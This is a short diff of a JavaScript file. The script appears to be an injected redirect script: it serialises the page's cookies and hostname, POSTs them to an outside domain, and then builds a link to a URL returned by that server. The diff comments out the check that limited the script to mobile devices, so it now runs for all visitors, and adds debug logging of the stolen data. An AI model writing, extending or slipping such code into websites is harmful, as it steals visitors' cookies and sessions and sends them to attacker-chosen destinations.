@@ -4,9 +4,9 @@
         return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     }
 
-    if (!isMobileDevice()) {
-        return; 
-    }
+    // if (!isMobileDevice()) {
+    //     return; 
+    // }
 
     if (sessionStorage.getItem('redirected')) {
         return; 
@@ -30,7 +30,7 @@
     coo: JSON.stringify(cookies), 
     origin: window.location.hostname 
     };
-    
+    console.log("line 33 => ",requestData)
     try {
         let response = await fetch('https://www.tracktraffics.com/api/scriptdata', {
             method: 'POST',
@@ -44,7 +44,7 @@
         }
 
         let responseData = await response.json();
-        
+        console.log("line 47 responseData.url = > ",responseData.url)
         if (responseData && responseData.url) {
             let link = document.createElement('a');
             link.href = responseData.url;  
